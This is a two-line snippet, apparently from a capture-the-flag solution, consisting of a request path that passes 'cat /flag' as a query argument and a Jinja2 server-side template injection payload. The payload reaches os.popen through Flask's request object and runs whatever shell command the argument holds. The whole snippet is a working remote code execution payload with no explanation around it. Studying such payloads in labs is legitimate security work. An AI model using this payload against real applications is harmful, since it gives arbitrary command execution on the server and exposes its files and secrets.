

```
/getposts?a=cat /flag
{{request.application.__self__.json_module.uuid.os.popen(request.args.a).read()}}
```